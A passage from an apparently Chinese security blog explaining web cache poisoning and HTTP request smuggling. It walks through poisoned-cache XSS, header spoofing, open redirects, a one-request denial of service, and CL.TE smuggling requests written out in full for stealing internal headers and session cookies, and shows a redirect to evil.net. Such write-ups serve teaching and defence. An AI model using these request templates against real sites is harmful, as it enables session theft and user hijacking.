alt="dom3"></p><p>可以看见json内容包含了网页翻译文本，那也就是说，我们可以控制网页翻译的文本，利用缓存毒化感染使用特定语言的用户</p><p>但我们在json返回的文本中可以看见，由于默认的语言是英语，故而英语不提供翻译文本，也就是说我们无法毒化使用英语的用户</p><p>所以我们需要找一个办法来强制使用英语的用户转变语言至我们控制的语言(这里使用es)</p><p>尝试更换语言至es，观察到浏览器发出了GET /setlang/es请求，响应如下</p><p><img src="/image/Web-Cache-Poisoning/dom4.jpg" alt="dom4"></p><p>可以发现，首先这个302是可以被缓存的，并且跳转后的页面路径是/?localized=1，那么就要考虑如何使得使用英语的用户在访问主页的时候“被迫”更换语言</p><p>通过对GET / 请求的分析，发现了我们可以使用X-Original-URL来重新指定访问的路径</p><p><img src="/image/Web-Cache-Poisoning/dom5.jpg" alt="dom5"></p><p>但是我们可以发现，这个请求无法被缓存，这样就无法将其传递给其他的用户</p><p>通过尝试，发现如果将X-Original-URL: /setlang/es转为X-Original-URL: /setlang\es，服务器将在302请求中将\转为正确的/，并且这样的请求将可以被服务器缓存</p><p><img src="/image/Web-Cache-Poisoning/dom6.jpg" alt="dom6"></p><p>那么现在，利用链已经完整了，首先毒化 <strong>/?localized=1</strong>，使其访问我们所制造的恶意的json文件，并且在 <strong>/?localized=1</strong>被毒化的时间内，毒化 <strong>/</strong> 页面，强制任何访问此页面的用户强制跳转至使用特定语言的 <strong>/?localized=1</strong> 页面，并执行我们所植入的恶意XSS payload。</p><p>成功图如下</p><p><img src="/image/Web-Cache-Poisoning/dom7.jpg" alt="dom7"></p><p>成功地执行了alert(document.cookie) 的payload</p><h2 id="路由中毒"><a href="#路由中毒" class="headerlink" title="路由中毒"></a>路由中毒</h2><p>除了以上的案列，有些服务器还会有不少令人匪夷所思的操作</p><p>比如下面这个，其会被恶意的http头欺骗，并使用此恶意的http标头来请求内部的路由</p><p><img src="/image/Web-Cache-Poisoning/route1.jpg" alt="route1"></p><p>可以看见X-Forwarded-Server标头将会有比Host标头更高的优先级，这欺骗了服务器，让其请求了非预期的资源。但是返回的响应由HTML编码，无法直接XSS</p><p>所以如果要利用这个漏洞，我们需要在HubSpot上托管一个自己的界面，并放入恶意的payload</p><p><img src="/image/Web-Cache-Poisoning/route2.jpg" alt="route2"></p><p>此类问题在SaaS程序上极为常见，因为他们往往会由一个系统来处理去往不同服务的请求</p><h2 id="标头“合作”"><a href="#标头“合作”" class="headerlink" title="标头“合作”"></a>标头“合作”</h2><p>有时候，往往一个欺骗性的标头并不一定能够展现出效果，这时候，就要尝试使用多个标头“合作”欺骗</p><p>来看看下面的实例</p><p><img src="/image/Web-Cache-Poisoning/more1.jpg" alt="more1"></p><p>可以看到X-Forwarded-Host头覆盖了cookie上的domain信息，但是这貌似不会带来任何的脆弱问题，仅仅只是修改了cookie的一个无关紧要的参数并不会带来任何的安全风险</p><p>这时候，试着尝试更多的标头，最终找到了另一个非预期的标头X-Forwarded-Scheme</p><p><img src="/image/Web-Cache-Poisoning/more2.jpg" alt="more2"></p><p>看起来貌似也没啥用，仍然没有任何的威胁</p><p>但是，但我们把两者结合起来，就会发生奇妙的化学反应，产生如下的结果</p><p><img src="/image/Web-Cache-Poisoning/more3.jpg" alt="more3"></p><p>从而我们就获得了劫持任意请求至任意域的能力</p><h2 id="劫持Open-Graph"><a href="#劫持Open-Graph" class="headerlink" title="劫持Open Graph"></a>劫持Open Graph</h2><p>Open Graph是由fb创建的协议，我们在分享一个链接的时候，只要分享的网站支持OG，那么就可以提供更详尽的视图，增强分享的效果</p><p>在下面的这个站点上，我们使用欺骗性的标头将会影响到OG的url</p><p><img src="/image/Web-Cache-Poisoning/og1.jpg" alt="og1"></p><p>可以看到我们影响到了OG的url部分，但是仔细查看响应可以发现，Cache-Control标头的值为private，并且在多次尝试后也证实了服务器拒绝缓存此响应</p><p>但是在其他的页面上，却仍然使用了缓存</p><p><img src="/image/Web-Cache-Poisoning/og2.jpg" alt="og2"></p><p>在这里需要注意，如果按照这样的请求，你会发现这个缓存将无法被有效的缓存，详情可以查看 <a href="https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/">CloudFlare缓存机制</a></p><p>所以我们需要使用如下的请求</p><p><img src="/image/Web-Cache-Poisoning/og3.jpg" alt="og3"></p><p> 此时就可以使得此响应被服务器缓存</p><p> 这样就导致了所有在此页面上使用分享功能的用户最终都会分享攻击者所指定的地址</p><p> <video src="/img/Web-Cache-Poisoning/hijack.mp4" width="1000px" height="1000px" controls="controls"></video></p><h2 id="本地路由中毒"><a href="#本地路由中毒" class="headerlink" title="本地路由中毒"></a>本地路由中毒</h2><p>除了X-Forwarded-For等标头以外，实际上还有许多神奇的标头可以实现缓存毒化</p><p>就比如我之前使用到的X-Original-URL，其和X-Rewrite-URL一样，都可以“强制”转变请求路径，且这一路径的转变是缓存服务器所“看不见”的</p><p>就拿Drupal框架来说，以下两个请求将是等价的，但是很明显，服务器对此的响应却是完全不同</p><p><img src="/image/Web-Cache-Poisoning/drupal1.jpg" alt="drupal1"></p><p><img src="/image/Web-Cache-Poisoning/drupal2.jpg" alt="drupal2"></p><p>那么，我们就可以利用这一特性来欺骗应用程序提供完全超出预期的页面，比如下图</p><p><img src="/image/Web-Cache-Poisoning/local-route1.jpg" alt="local-route1"></p><p>如果我们发送这样的请求，那么对于前端缓存服务器来说，其所看到的是/education?x=y，但是实际后端服务器解析的访问路径却是/gambling?x=y</p><p>这样就会使得每一个访问/education?x=y路径的用户意外的得到/gambling?x=y的页面</p><p>当然，除了对于路径的毒化之外，缓存也有可能被毒化查询参数</p><p><img src="/image/Web-Cache-Poisoning/local-route2.jpg" alt="local-route2"></p><p>这样的话，我们将有机会诱导受害者查询非预期的结果</p><p>另外，如果遇到利用重定向来导入js文件的网站，如果存在缓存毒化漏洞，那么攻击者就有可能劫持js文件的加载，强迫受害者加载外部恶意js文件</p><h2 id="Drupal开放式重定向"><a href="#Drupal开放式重定向" class="headerlink" title="Drupal开放式重定向"></a>Drupal开放式重定向</h2><p>首先，Drupal框架存在这样的一个问题，即如下的请求将会导致Drupal框架错误的将用户导向任意一个外部网站</p><p><img src="/image/Web-Cache-Poisoning/drupal-or.jpg" alt="drupal-or"></p><p>那么，配合缓存毒化漏洞，将会有意想不到的结果</p><p>首先我们先发送如下请求，毒化Drupal的内置缓存</p><p><img src="/image/Web-Cache-Poisoning/drupal-posion-internal.jpg" alt="drupal-posion-internal"></p><p>这样，drupal在接到访问/redir路径的请求时，将会直接返回指向外部恶意网站的302重定向响应</p><p>接着我们毒化外部缓存</p><p><img src="/image/Web-Cache-Poisoning/drupal-posion-external.jpg" alt="drupal-posion-external"></p><p>此时，外部任意用户访问/download路径都将会被后端的Drupal缓存认为在访问/redir，从而返回恶意的302响应，并被外部缓存服务器所缓存</p><p>这样，我们就可以基于此向受害者下发恶意软件，导致极大的风险</p><h2 id="一个请求瘫痪网站"><a href="#一个请求瘫痪网站" class="headerlink" title="一个请求瘫痪网站"></a>一个请求瘫痪网站</h2><p>听起来貌似不太可能，但是如果目标网站有着缓存毒化漏洞，那么这是完全可能的</p><p>假想以下一个请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index?v&#x3D;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;test</span><br></pre></td></tr></table></figure><p>再尝试发一个请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;test</span><br></pre></td></tr></table></figure><p>我们可以看到，服务器将301缓存了起来，但是由于我们只能污染查询参数，所以在这看来并没有什么用处</p><p>但是，仔细想想，你会发现实际上我们可以利用一个很少见的http状态码—414</p><p>我们发送以下的请求，将url填充至最大字节，且假设响应被缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index?v&#x3D;&lt;long-string&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt;</span><br></pre></td></tr></table></figure><p>那么当有人访问index时，会得到如下响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt;</span><br></pre></td></tr></table></figure><p>那么这时，你会发现在重定向时，301响应为我们补全了index后的/符号</p><p>这就导致了如果受害者的浏览器收到这样的重定向响应后，由于本身url已经是最大值，而此时301响应多补了一个/，这就导致了url过长，使得任何一个用户访问index，都会得到一个HTTP 414响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 414 Request-URI Too Large</span><br><span class="line">CF-Cache-Status: MISS</span><br></pre></td></tr></table></figure><p>这就造成了拒绝服务攻击，而且这仅仅需要一个请求</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没啥好说的，骚就完事了</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Smuggling攻击</title>
      <link href="HTTP-Smuggling.html"/>
      <url>HTTP-Smuggling.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实际上HTTP Smuggling已经不是一个很新的攻击技术，早在2005年，就已经有人提出过这一攻击方式，只是这一攻击方式普遍被认为过于复杂以及难以利用于实战，故而在被提出后并没有受到太多的重视</p><p>然而，往往人们不看好的东西会有着巨大的财富</p><p>借用albinowax的原话:</p><p><strong>If a technique has a reputation for being difficult, fiddly, or dangerous, that’s a topic in dire need of further research. After repeatedly experiencing breakthroughs due to being pressured into exploring topics well outside my comfort zone, I’ve decided that the fastest route to novel findings is actively seeking out topics that make you uncomfortable. Chances are, these topics are avoided by other hackers, giving them serious research potential. To me, this is the only plausible explanation for why I was able to take a technique first documented in 2005, and presented again at DEF CON in 2016, and use it to earn $70k in bounties in 2019.</strong></p><p>所以，好好研究，没有不好用的攻击技术，只有你不会玩的～</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>HTTP偷渡(HTTP Smuggling)的原理可以简单用下面两张图来解释:</p><p>首先是正常环境下的，用户访问一个带有反代服务器的网站:</p><p><img src="/image/HTTP-Smuggling/normal-reverse-proxy.jpg" alt="normal"></p><p>可以看到，由于HTTP / 1.1的兴起，反向代理服务器往往会将多个用户的请求通过单个的tcp链接串联在一起发送至后端服务器，实际上这一方法本身是无害的，只要前后端对于每一个消息的开始、结束位置达成一致，那么这一技术会大大减轻前后端服务器的负载，加快数据传输的效率。</p><p>但是，这也成为了一个薄弱的环节，因为这就意味着前后端必须对每个消息的结束位置达成一致，如果无法达成一致，那么就有可能发生如下图的情况:</p><p><img src="/image/HTTP-Smuggling/smuggling-reverse-proxy.jpg" alt="smuggling"></p><p>也就是说攻击者可以构造畸形模糊的请求，使得后端服务器在处理攻击者的请求时只处理了“部分”恶意请求，而把“剩余”的恶意请求以及正常的用户请求视作同一个请求并进行处理，从而劫持用户的请求。</p><p>这种攻击手法，就被称为HTTP偷渡(HTTP Smuggling)技术</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>首先，现在的核心问题在于，我们应该如何构造一个所谓的<strong>畸形模糊的请求</strong>？</p><p>这里就要引入一个我们大家都很熟知的概念—Transfer-Encoding</p><p>相信大多数人知道这个概念都是因为我们可以利用Transfer-Encoding绕过waf，但是，实际上这一技术带来了许多神奇的攻击面，包括今天讨论的主角HTTP Smuggling</p><p>我们大家都知道，一个HTTP POST请求当中往往会有一个Content-Length头，这个头标示了此POST请求所携带的数据的长度，而如果我们在一个HTTP请求当中同时添加两个Content-Length头，并且使用不同的值，绝大多数的服务器会直接拒绝这种格式的请求，认为此格式是非法的</p><p>但是，参考RFC 2616规范，如果同时存在Content-Length以及Transfer-Encoding头，文档规定Content-Length头需要被忽略。故而我们可以得知一点：如果一个post请求当中同时携带Content-Length以及Transfer-Encoding头，那么这个请求是合法的，绝大多数的服务器并不会拒绝这样的请求</p><p>那么问题就来了，如果两台服务器对这样的请求，一台服务器不支持Transfer-Encoding，另一台支持，那么，整个系统就不同步了，攻击者可以籍此触发HTTP Smuggling漏洞</p><p>以下两张图可以帮助理解此问题:</p><ul><li>首先我假设前端服务器并不支持Transfer-Encoding，而后端服务器支持，在HTTP Smuggling中，我们往往将这一情况称为CL.​​TE</li></ul><p><img src="/image/HTTP-Smuggling/CL_TE.jpg" alt="CL.​​TE"></p><p>在图中，我们可以看到，由于前端服务器不支持Transfer-Encoding，故而前端服务器只会转发蓝色的文本至后端服务器，而后端服务器由于一直无法收到以0结尾的Transfer-Encoding消息结束块，故而会一直等待，此链接就会超时。</p><ul><li>而如果前端服务器支持Transfer-Encoding，后端服务器不支持，那么在HTTP Smuggling中，这类情况被称为TE.CL</li></ul><p><img src="/image/HTTP-Smuggling/TE_CL.jpg" alt="TE.CL"></p><p>在图中，可以看到由于前端服务器支持Transfer-Encoding，故而前端只会转发蓝色字体部分至后端服务器，而此时由于后端服务器需要读取6个字节长度的数据，需要等待最后一个X的到来，故而此时链接就会超时</p><p>这两种方式都可以用来检测潜在的HTTP Smuggling风险</p><p>那么也许有人会说，这不过就是让自己的链接超时罢了，没有什么大用，如果是这么想的话，看看下图如何？</p><p><img src="/image/HTTP-Smuggling/basic_attack.jpg" alt="Attack"></p><p>从图中可以看到，这是一个CL.​​TE类型的HTTP Smuggling攻击，前端服务器转发了包括蓝色及橙色消息在内的所有消息，而后端服务器在解析的过程中，只解析了蓝色字体部分，这就使得橙色消息被留在了缓冲区中，并与后来的一个受害者请求(绿色字体)合并，称为了一个新的HTTP请求</p><p>也就是说，原本受害者希望向/search路径POST一个请求，但是由于HTTP Smuggling的存在，后端服务器在用户完全不知情的情况下，误认为受害者向/404发出了一个get请求，从而引发了受害者无法访问/search路径的问题。</p><p>而这里的路径是完全可以自定义的，攻击者完全可以利用HTTP Smuggling漏洞迫使受害者加载恶意的外部js或者结合缓存漏洞形成拒绝服务攻击</p><h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><p>上面我简单介绍了一些HTTP Smuggling的基础攻击手段及方式，接下来，我将更深入探讨HTTP Smuggling的更多用法</p><h3 id="窃取“秘密的”HTTP标头"><a href="#窃取“秘密的”HTTP标头" class="headerlink" title="窃取“秘密的”HTTP标头"></a>窃取“秘密的”HTTP标头</h3><p>相信大家都知道，很多反向代理服务器会在代理HTTP请求至后端服务器的同时，附加一些HTTP头，比如我们所熟知的X-Real-IP等等</p><p>这些标头里往往包含有一些比较敏感的信息，因为有些网站会将认证相关的信息附在HTTP头中</p><p>HTTP Smuggling攻击将帮助我们获取这些敏感信息</p><p>首先，我们需要一个存在漏洞的网站(在此例中是CL-TE)并找到一个能够反射出我们输入的参数的端点，比如我们常用的搜索框：</p><p><img src="/image/HTTP-Smuggling/search.jpg" alt="search"></p><p>可以看到，我搜索了“hello”后，上方的提示栏会将我们搜索的内容反射出来</p><p>既然如此，我就可以构造如下的请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure><p>由于CL-TE型漏洞的存在，故而前端将会转发所有的请求字符，但是，后端服务器在解析时，却仅解析了终止符，故而以下的字符被留在了缓冲区中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure><p>当我将第一个请求再次发送时，在后端服务器看来，将会变成这个样子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;helloPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Unknown-header:xxxxxxxxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><p>最终可以看见这样的返回:</p><p><img src="/image/HTTP-Smuggling/search-smuggling.jpg" alt="search-smuggling"></p><p>可以看到，后端服务器误把第二个POST请求当作了HTTP头，返回并暴露了敏感的头信息</p><p>基于此信息，就有机会可以进一步利用内网的api等敏感基础设施</p><h3 id="窃取身份验证信息"><a href="#窃取身份验证信息" class="headerlink" title="窃取身份验证信息"></a>窃取身份验证信息</h3><p>这个和上一个很像，基于同样的原理，我们可以窃取并保存用户的身份验证信息</p><p>发送如下的请求：</p><p><img src="/image/HTTP-Smuggling/cookie.jpg" alt="cookie"></p><p>在此例中，服务器存在TE-CL漏洞，前端服务器将蓝色及橙色字体完整地转发给了后端服务器，而由于后端服务器不支持TE头，故而只能解析蓝色字体部分，橙色字体的部分便被留在了缓冲区中，等待受害者请求(绿色字体)到来时，橙色字体部分将和上一个例子一样，与绿色字体部分相结合，构成一个完整的HTTP请求，从而使得受害者本身的GET请求变为了一个更新个人信息的请求(这里的个人信息是攻击者的个人信息)</p><p>攻击成功后如下:</p><p><img src="/image/HTTP-Smuggling/cookie-smuggling.jpg" alt="cookie-smuggling"></p><p>可以看见，受害者的HTTP头信息被保存在了攻击者的bio中，只需要调节橙色部分的CL长度，就可以将受害者的所有HTTP头全部窃取</p><h3 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self-XSS"></a>Self-XSS</h3><p>相信大家在挖洞的过程中一定遇到过不少的self-xss，这类xss很难被利用，所以往往我们在遇到这类漏洞的时候，会选择直接忽略</p><p>然而，若网站存在HTTP Smuggling漏洞，那么，Self-XSS也将成为威力巨大的武器</p><p>如果一个网站存在HTTP Smuggling漏洞，且其SAML参数容易收到XSS攻击的影响，那么，发送如下的请求：</p><p><img src="/image/HTTP-Smuggling/self-xss.jpg" alt="self-xss"></p><p>解析过程如前两例所示，此时黑色字体将是受害者所获得的HTTP响应，已然被植入了XSS Payload</p><p>借助HTTP Smuggling，Self-XSS也将成为不可忽视的漏洞点</p><h3 id="Open-Redirecting"><a href="#Open-Redirecting" class="headerlink" title="Open-Redirecting"></a>Open-Redirecting</h3><p>同样的，由于我们可以实现Self-XSS，那么，在遇到一些基于DOM的开放重定向时，HTTP Smuggling也能发挥一波</p><p>例如在redhat.com上有一个页面有如下的代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;assets&#x2F;idx?redir&#x3D;&#x2F;&#x2F;redhat.com@evil.net&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.redhat.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var destination &#x3D; getQueryParam(&#39;redir&#39;)</span><br><span class="line">[poor filtering]</span><br><span class="line">document.location &#x3D; destination</span><br></pre></td></tr></table></figure><p>js尝试读取get请求中的redir的值并将网页重定向至其所指向的页面</p><p>此时发送如下的请求：</p><p><img src="/image/HTTP-Smuggling/open-redirect.jpg" alt="open-redirect"></p><p>我们就可以劫持任意用户跳转至我们所希望的网页。</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>许多网站会使用CDN技术，并且CDN的提供商也往往提供基于HOST标头，从一个网站访问同一CDN网络上的另一个网站的服务</p><p>那么，我们可以对存在漏洞的网站发送如下的请求:</p><p><img src="/image/HTTP-Smuggling/cdn.jpg" alt="cdn"></p><p>这样我们就可以将原本访问redacted.com的受害者引导至<a href="http://www.redhat.com网站">www.redhat.com网站</a></p><p>更进一步说，我们完全可以使用户加载一个错误且非预期的资源</p><p>SaaS提供商同样适用这一特性</p><h3 id="“帮凶”-Apache和IIS"><a href="#“帮凶”-Apache和IIS" class="headerlink" title="“帮凶” Apache和IIS"></a>“帮凶” Apache和IIS</h3><p>相信大家应该都有注意到基于Apache以及IIS所搭建的网站都有一个这样的特性，就是当你访问一个不以反斜杠结尾的文件夹时，Apache和IIS都将会以HOST标头为基础重定向响应，以此来向文件夹末尾追加斜杠</p><p>比如说这样一个请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>在发往由Apache以及IIS搭建的网站时，会收到如下的回复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;example.com&#x2F;test&#x2F; </span><br></pre></td></tr></table></figure><p>基于这个看来无害的特性，同时利用HTTP-Smuggling，我们可以使用如下的方式进行攻击:</p><p><img src="/image/HTTP-Smuggling/apache-iis.jpg" alt="apache-iis"></p><p>如图就可以将受害者的请求导向我们所指定的网站，另外，如果目标网站回复的是307的状态码，则可以更进一步，窃取用户POST的敏感数据</p><p>因为307会使得POST请求重新发送至新的目标,但是需要用户的确认，RFC原文为: If the 307 status code is received in response to a request other than GET or HEAD, the user agent MUST NOT automatically redirect the request unless it can be confirmed by the user, since this might change the conditions under which the request was issued</p><h3 id="缓存毒化"><a href="#缓存毒化" class="headerlink" title="缓存毒化"></a>缓存毒化</h3><p>缓存毒化是一个很有趣的话题，我会在之后的blog中详细讨论这个技术，现在，来瞅瞅这一技术如何与HTTP-Smuggling配合，实现惊人的效果</p><p>例如我们向目标网站发出如下请求:</p><p><img src="/image/HTTP-Smuggling/cache-posion.jpg" alt="cache-posion"></p><p>受害者本身是访问/static/site.js的，然而却被我们劫持并访问了自己的账户信息，并且此时这个请求是携带受害者本身的cookie的</p><p>如果此网站存在缓存漏洞，那么在后端服务器返回账户信息的同时，缓存会错误的认为，/static/site.js的响应是受害者/account/settings所返回的信息并将其缓存</p><p>此时，作为攻击者，我们只需要访问/static/site.js这个静态文件，就可以获得受害者的账户信息:</p><p><img src="/image/HTTP-Smuggling/account.jpg" alt="account"></p><h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>接下来的攻击实例是基于albinowax大神对于paypal的攻击</p><h3 id="发现请求走私漏洞"><a href="#发现请求走私漏洞" class="headerlink" title="发现请求走私漏洞"></a>发现请求走私漏洞</h3><p>首先攻击者发现了paypal登录页面上存在请求走私的漏洞，基于此，攻击者可以劫持几乎所有的paypal登陆界面所引用的js文件，如下:</p><p><img src="/image/HTTP-Smuggling/paypal-smuggling.jpg" alt="paypal-smuggling"></p><p>由于paypal使用了CDN，基于我之前介绍的基于CDN的攻击，攻击者可以籍此劫持受害者的js文件至外部网站的恶意js文件</p><p>注意，这里location重定向指向了http网站，而paypal网站是https的，故而无法引入http资源，但是在Safari和IE上有特例,Safari拥有HSTS机制，如果这个转向的网站已经在safari的HSTS缓存中，那么http将自动升级为https；而IE则是可以完全绕过这一限制，在https中引入http资源</p><p>所以本次攻击只对Safari和IE用户生效！</p><h3 id="解决CSP"><a href="#解决CSP" class="headerlink" title="解决CSP"></a>解决CSP</h3><p>但是，由于paypal使用了CSP策略，故而劫持失败了</p><p><img src="/image/HTTP-Smuggling/paypal-csp.jpg" 